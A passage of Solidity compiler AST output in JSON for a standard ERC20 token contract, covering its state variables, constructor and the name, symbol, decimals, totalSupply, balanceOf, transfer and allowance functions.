									"nameLocation": "1624:9:0",
									"nodeType": "VariableDeclaration",
									"scope": 586,
									"src": "1588:45:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
										"typeString": "mapping(address => uint256)"
									},
									"typeName": {
										"id": 14,
										"keyName": "",
										"keyNameLocation": "-1:-1:-1",
										"keyType": {
											"id": 12,
											"name": "address",
											"nodeType": "ElementaryTypeName",
											"src": "1596:7:0",
											"typeDescriptions": {
												"typeIdentifier": "t_address",
												"typeString": "address"
											}
										},
										"nodeType": "Mapping",
										"src": "1588:27:0",
										"typeDescriptions": {
											"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
											"typeString": "mapping(address => uint256)"
										},
										"valueName": "",
										"valueNameLocation": "-1:-1:-1",
										"valueType": {
											"id": 13,
											"name": "uint256",
											"nodeType": "ElementaryTypeName",
											"src": "1607:7:0",
											"typeDescriptions": {
												"typeIdentifier": "t_uint256",
												"typeString": "uint256"
											}
										}
									},
									"visibility": "private"
								},
								{
									"constant": false,
									"id": 21,
									"mutability": "mutable",
									"name": "_allowances",
									"nameLocation": "1696:11:0",
									"nodeType": "VariableDeclaration",
									"scope": 586,
									"src": "1640:67:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_mapping$_t_address_$_t_mapping$_t_address_$_t_uint256_$_$",
										"typeString": "mapping(address => mapping(address => uint256))"
									},
									"typeName": {
										"id": 20,
										"keyName": "",
										"keyNameLocation": "-1:-1:-1",
										"keyType": {
											"id": 16,
											"name": "address",
											"nodeType": "ElementaryTypeName",
											"src": "1648:7:0",
											"typeDescriptions": {
												"typeIdentifier": "t_address",
												"typeString": "address"
											}
										},
										"nodeType": "Mapping",
										"src": "1640:47:0",
										"typeDescriptions": {
											"typeIdentifier": "t_mapping$_t_address_$_t_mapping$_t_address_$_t_uint256_$_$",
											"typeString": "mapping(address => mapping(address => uint256))"
										},
										"valueName": "",
										"valueNameLocation": "-1:-1:-1",
										"valueType": {
											"id": 19,
											"keyName": "",
											"keyNameLocation": "-1:-1:-1",
											"keyType": {
												"id": 17,
												"name": "address",
												"nodeType": "ElementaryTypeName",
												"src": "1667:7:0",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												}
											},
											"nodeType": "Mapping",
											"src": "1659:27:0",
											"typeDescriptions": {
												"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
												"typeString": "mapping(address => uint256)"
											},
											"valueName": "",
											"valueNameLocation": "-1:-1:-1",
											"valueType": {
												"id": 18,
												"name": "uint256",
												"nodeType": "ElementaryTypeName",
												"src": "1678:7:0",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												}
											}
										}
									},
									"visibility": "private"
								},
								{
									"constant": false,
									"id": 23,
									"mutability": "mutable",
									"name": "_totalSupply",
									"nameLocation": "1730:12:0",
									"nodeType": "VariableDeclaration",
									"scope": 586,
									"src": "1714:28:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 22,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "1714:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"visibility": "private"
								},
								{
									"constant": false,
									"id": 25,
									"mutability": "mutable",
									"name": "_name",
									"nameLocation": "1764:5:0",
									"nodeType": "VariableDeclaration",
									"scope": 586,
									"src": "1749:20:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_string_storage",
										"typeString": "string"
									},
									"typeName": {
										"id": 24,
										"name": "string",
										"nodeType": "ElementaryTypeName",
										"src": "1749:6:0",
										"typeDescriptions": {
											"typeIdentifier": "t_string_storage_ptr",
											"typeString": "string"
										}
									},
									"visibility": "private"
								},
								{
									"constant": false,
									"id": 27,
									"mutability": "mutable",
									"name": "_symbol",
									"nameLocation": "1790:7:0",
									"nodeType": "VariableDeclaration",
									"scope": 586,
									"src": "1775:22:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_string_storage",
										"typeString": "string"
									},
									"typeName": {
										"id": 26,
										"name": "string",
										"nodeType": "ElementaryTypeName",
										"src": "1775:6:0",
										"typeDescriptions": {
											"typeIdentifier": "t_string_storage_ptr",
											"typeString": "string"
										}
									},
									"visibility": "private"
								},
								{
									"body": {
										"id": 43,
										"nodeType": "Block",
										"src": "2036:57:0",
										"statements": [
											{
												"expression": {
													"id": 37,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 35,
														"name": "_name",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 25,
														"src": "2046:5:0",
														"typeDescriptions": {
															"typeIdentifier": "t_string_storage",
															"typeString": "string storage ref"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"id": 36,
														"name": "name_",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 30,
														"src": "2054:5:0",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string memory"
														}
													},
													"src": "2046:13:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage",
														"typeString": "string storage ref"
													}
												},
												"id": 38,
												"nodeType": "ExpressionStatement",
												"src": "2046:13:0"
											},
											{
												"expression": {
													"id": 41,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 39,
														"name": "_symbol",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 27,
														"src": "2069:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_string_storage",
															"typeString": "string storage ref"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"id": 40,
														"name": "symbol_",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 32,
														"src": "2079:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string memory"
														}
													},
													"src": "2069:17:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage",
														"typeString": "string storage ref"
													}
												},
												"id": 42,
												"nodeType": "ExpressionStatement",
												"src": "2069:17:0"
											}
										]
									},
									"documentation": {
										"id": 28,
										"nodeType": "StructuredDocumentation",
										"src": "1804:171:0",
										"text": " @dev Sets the values for {name} and {symbol}.\n All two of these values are immutable: they can only be set once during\n construction."
									},
									"id": 44,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nameLocation": "-1:-1:-1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 33,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 30,
												"mutability": "mutable",
												"name": "name_",
												"nameLocation": "2006:5:0",
												"nodeType": "VariableDeclaration",
												"scope": 44,
												"src": "1992:19:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 29,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "1992:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 32,
												"mutability": "mutable",
												"name": "symbol_",
												"nameLocation": "2027:7:0",
												"nodeType": "VariableDeclaration",
												"scope": 44,
												"src": "2013:21:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 31,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "2013:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "1991:44:0"
									},
									"returnParameters": {
										"id": 34,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2036:0:0"
									},
									"scope": 586,
									"src": "1980:113:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"baseFunctions": [
										676
									],
									"body": {
										"id": 53,
										"nodeType": "Block",
										"src": "2227:29:0",
										"statements": [
											{
												"expression": {
													"id": 51,
													"name": "_name",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 25,
													"src": "2244:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage",
														"typeString": "string storage ref"
													}
												},
												"functionReturnParameters": 50,
												"id": 52,
												"nodeType": "Return",
												"src": "2237:12:0"
											}
										]
									},
									"documentation": {
										"id": 45,
										"nodeType": "StructuredDocumentation",
										"src": "2099:54:0",
										"text": " @dev Returns the name of the token."
									},
									"functionSelector": "06fdde03",
									"id": 54,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "name",
									"nameLocation": "2167:4:0",
									"nodeType": "FunctionDefinition",
									"overrides": {
										"id": 47,
										"nodeType": "OverrideSpecifier",
										"overrides": [],
										"src": "2194:8:0"
									},
									"parameters": {
										"id": 46,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2171:2:0"
									},
									"returnParameters": {
										"id": 50,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 49,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 54,
												"src": "2212:13:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 48,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "2212:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "2211:15:0"
									},
									"scope": 586,
									"src": "2158:98:0",
									"stateMutability": "view",
									"virtual": true,
									"visibility": "public"
								},
								{
									"baseFunctions": [
										682
									],
									"body": {
										"id": 63,
										"nodeType": "Block",
										"src": "2440:31:0",
										"statements": [
											{
												"expression": {
													"id": 61,
													"name": "_symbol",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 27,
													"src": "2457:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage",
														"typeString": "string storage ref"
													}
												},
												"functionReturnParameters": 60,
												"id": 62,
												"nodeType": "Return",
												"src": "2450:14:0"
											}
										]
									},
									"documentation": {
										"id": 55,
										"nodeType": "StructuredDocumentation",
										"src": "2262:102:0",
										"text": " @dev Returns the symbol of the token, usually a shorter version of the\n name."
									},
									"functionSelector": "95d89b41",
									"id": 64,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "symbol",
									"nameLocation": "2378:6:0",
									"nodeType": "FunctionDefinition",
									"overrides": {
										"id": 57,
										"nodeType": "OverrideSpecifier",
										"overrides": [],
										"src": "2407:8:0"
									},
									"parameters": {
										"id": 56,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2384:2:0"
									},
									"returnParameters": {
										"id": 60,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 59,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 64,
												"src": "2425:13:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 58,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "2425:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "2424:15:0"
									},
									"scope": 586,
									"src": "2369:102:0",
									"stateMutability": "view",
									"virtual": true,
									"visibility": "public"
								},
								{
									"baseFunctions": [
										688
									],
									"body": {
										"id": 73,
										"nodeType": "Block",
										"src": "3169:26:0",
										"statements": [
											{
												"expression": {
													"hexValue": "3138",
													"id": 71,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "3186:2:0",
													"typeDescriptions": {
														"typeIdentifier": "t_rational_18_by_1",
														"typeString": "int_const 18"
													},
													"value": "18"
												},
												"functionReturnParameters": 70,
												"id": 72,
												"nodeType": "Return",
												"src": "3179:9:0"
											}
										]
									},
									"documentation": {
										"id": 65,
										"nodeType": "StructuredDocumentation",
										"src": "2477:622:0",
										"text": " @dev Returns the number of decimals used to get its user representation.\n For example, if `decimals` equals `2`, a balance of `505` tokens should\n be displayed to a user as `5.05` (`505 / 10 ** 2`).\n Tokens usually opt for a value of 18, imitating the relationship between\n Ether and Wei. This is the default value returned by this function, unless\n it's overridden.\n NOTE: This information is only used for _display_ purposes: it in\n no way affects any of the arithmetic of the contract, including\n {IERC20-balanceOf} and {IERC20-transfer}."
									},
									"functionSelector": "313ce567",
									"id": 74,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "decimals",
									"nameLocation": "3113:8:0",
									"nodeType": "FunctionDefinition",
									"overrides": {
										"id": 67,
										"nodeType": "OverrideSpecifier",
										"overrides": [],
										"src": "3144:8:0"
									},
									"parameters": {
										"id": 66,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "3121:2:0"
									},
									"returnParameters": {
										"id": 70,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 69,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 74,
												"src": "3162:5:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint8",
													"typeString": "uint8"
												},
												"typeName": {
													"id": 68,
													"name": "uint8",
													"nodeType": "ElementaryTypeName",
													"src": "3162:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint8",
														"typeString": "uint8"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "3161:7:0"
									},
									"scope": 586,
									"src": "3104:91:0",
									"stateMutability": "view",
									"virtual": true,
									"visibility": "public"
								},
								{
									"baseFunctions": [
										613
									],
									"body": {
										"id": 83,
										"nodeType": "Block",
										"src": "3325:36:0",
										"statements": [
											{
												"expression": {
													"id": 81,
													"name": "_totalSupply",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 23,
													"src": "3342:12:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 80,
												"id": 82,
												"nodeType": "Return",
												"src": "3335:19:0"
											}
										]
									},
									"documentation": {
										"id": 75,
										"nodeType": "StructuredDocumentation",
										"src": "3201:49:0",
										"text": " @dev See {IERC20-totalSupply}."
									},
									"functionSelector": "18160ddd",
									"id": 84,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "totalSupply",
									"nameLocation": "3264:11:0",
									"nodeType": "FunctionDefinition",
									"overrides": {
										"id": 77,
										"nodeType": "OverrideSpecifier",
										"overrides": [],
										"src": "3298:8:0"
									},
									"parameters": {
										"id": 76,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "3275:2:0"
									},
									"returnParameters": {
										"id": 80,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 79,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 84,
												"src": "3316:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 78,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3316:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "3315:9:0"
									},
									"scope": 586,
									"src": "3255:106:0",
									"stateMutability": "view",
									"virtual": true,
									"visibility": "public"
								},
								{
									"baseFunctions": [
										621
									],
									"body": {
										"id": 97,
										"nodeType": "Block",
										"src": "3502:42:0",
										"statements": [
											{
												"expression": {
													"baseExpression": {
														"id": 93,
														"name": "_balances",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 15,
														"src": "3519:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
															"typeString": "mapping(address => uint256)"
														}
													},
													"id": 95,
													"indexExpression": {
														"id": 94,
														"name": "account",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 87,
														"src": "3529:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"isConstant": false,
													"isLValue": true,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "IndexAccess",
													"src": "3519:18:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 92,
												"id": 96,
												"nodeType": "Return",
												"src": "3512:25:0"
											}
										]
									},
									"documentation": {
										"id": 85,
										"nodeType": "StructuredDocumentation",
										"src": "3367:47:0",
										"text": " @dev See {IERC20-balanceOf}."
									},
									"functionSelector": "70a08231",
									"id": 98,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "balanceOf",
									"nameLocation": "3428:9:0",
									"nodeType": "FunctionDefinition",
									"overrides": {
										"id": 89,
										"nodeType": "OverrideSpecifier",
										"overrides": [],
										"src": "3475:8:0"
									},
									"parameters": {
										"id": 88,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 87,
												"mutability": "mutable",
												"name": "account",
												"nameLocation": "3446:7:0",
												"nodeType": "VariableDeclaration",
												"scope": 98,
												"src": "3438:15:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 86,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "3438:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "3437:17:0"
									},
									"returnParameters": {
										"id": 92,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 91,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 98,
												"src": "3493:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 90,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3493:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "3492:9:0"
									},
									"scope": 586,
									"src": "3419:125:0",
									"stateMutability": "view",
									"virtual": true,
									"visibility": "public"
								},
								{
									"baseFunctions": [
										631
									],
									"body": {
										"id": 122,
										"nodeType": "Block",
										"src": "3825:104:0",
										"statements": [
											{
												"assignments": [
													110
												],
												"declarations": [
													{
														"constant": false,
														"id": 110,
														"mutability": "mutable",
														"name": "owner",
														"nameLocation": "3843:5:0",
														"nodeType": "VariableDeclaration",
														"scope": 122,
														"src": "3835:13:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														},
														"typeName": {
															"id": 109,
															"name": "address",
															"nodeType": "ElementaryTypeName",
															"src": "3835:7:0",
															"stateMutability": "nonpayable",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 113,
												"initialValue": {
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"id": 111,
														"name": "_msgSender",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 701,
														"src": "3851:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_view$__$returns$_t_address_$",
															"typeString": "function () view returns (address)"
														}
													},
													"id": 112,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "3851:12:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "3835:28:0"
											},
											{
												"expression": {
													"arguments": [
														{
															"id": 115,
															"name": "owner",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 110,
															"src": "3883:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"id": 116,
															"name": "to",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 101,
															"src": "3890:2:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"id": 117,
															"name": "amount",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 103,
															"src": "3894:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 114,
														"name": "_transfer",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 346,
														"src": "3873:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256)"
														}
													},
													"id": 118,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "3873:28:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 119,
												"nodeType": "ExpressionStatement",
												"src": "3873:28:0"
											},
											{
												"expression": {
													"hexValue": "74727565",
													"id": 120,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "bool",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "3918:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													},
													"value": "true"
												},
												"functionReturnParameters": 108,
												"id": 121,
												"nodeType": "Return",
												"src": "3911:11:0"
											}
										]
									},
									"documentation": {
										"id": 99,
										"nodeType": "StructuredDocumentation",
										"src": "3550:185:0",
										"text": " @dev See {IERC20-transfer}.\n Requirements:\n - `to` cannot be the zero address.\n - the caller must have a balance of at least `amount`."
									},
									"functionSelector": "a9059cbb",
									"id": 123,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "transfer",
									"nameLocation": "3749:8:0",
									"nodeType": "FunctionDefinition",
									"overrides": {
										"id": 105,
										"nodeType": "OverrideSpecifier",
										"overrides": [],
										"src": "3801:8:0"
									},
									"parameters": {
										"id": 104,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 101,
												"mutability": "mutable",
												"name": "to",
												"nameLocation": "3766:2:0",
												"nodeType": "VariableDeclaration",
												"scope": 123,
												"src": "3758:10:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 100,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "3758:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 103,
												"mutability": "mutable",
												"name": "amount",
												"nameLocation": "3778:6:0",
												"nodeType": "VariableDeclaration",
												"scope": 123,
												"src": "3770:14:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 102,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3770:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "3757:28:0"
									},
									"returnParameters": {
										"id": 108,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 107,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 123,
												"src": "3819:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 106,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "3819:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "3818:6:0"
									},
									"scope": 586,
									"src": "3740:189:0",
									"stateMutability": "nonpayable",
									"virtual": true,
									"visibility": "public"
								},
								{
									"baseFunctions": [
										641
									],
									"body": {
										"id": 140,
										"nodeType": "Block",
										"src": "4085:51:0",
										"statements": [
											{
												"expression": {
													"baseExpression": {
														"baseExpression": {
															"id": 134,
															"name": "_allowances",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 21,
															"src": "4102:11:0",
															"typeDescriptions": {
																"typeIdentifier": "t_mapping$_t_address_$_t_mapping$_t_address_$_t_uint256_$_$",
																"typeString": "mapping(address => mapping(address => uint256))"
															}
														},
														"id": 136,
														"indexExpression": {
															"id": 135,
															"name": "owner",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 126,
															"src": "4114:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"nodeType": "IndexAccess",
														"src": "4102:18:0",
														"typeDescriptions": {
															"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
															"typeString": "mapping(address => uint256)"
														}
													},
													"id": 138,
													"indexExpression": {
														"id": 137,
														"name": "spender",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 128,
														"src": "4121:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"isConstant": false,
													"isLValue": true,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "IndexAccess",
													"src": "4102:27:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 133,
												"id": 139,
												"nodeType": "Return",
												"src": "4095:34:0"
											}
										]
									},
									"documentation": {
										"id": 124,
										"nodeType": "StructuredDocumentation",
										"src": "3935:47:0",
										"text": " @dev See {IERC20-allowance}."
									},
									"functionSelector": "dd62ed3e",
									"id": 141,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "allowance",
									"nameLocation": "3996:9:0",
									"nodeType": "FunctionDefinition",
									"overrides": {
										"id": 130,
										"nodeType": "OverrideSpecifier",
										"overrides": [],
										"src": "4058:8:0"
									},
									"parameters": {
										"id": 129,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 126,
												"mutability": "mutable",
												"name": "owner",
												"nameLocation": "4014:5:0",
												"nodeType": "VariableDeclaration",
												"scope": 141,
												"src": "4006:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 125,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "4006:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 128,
												"mutability": "mutable",
												"name": "spender",
												"nameLocation": "4029:7:0",
												"nodeType": "VariableDeclaration",
												"scope": 141,
												"src": "4021:15:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 127,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "4021:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "4005:32:0"
									},
									"returnParameters": {
										"id": 133,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 132,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 141,
												"src": "4076:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 131,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4076:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
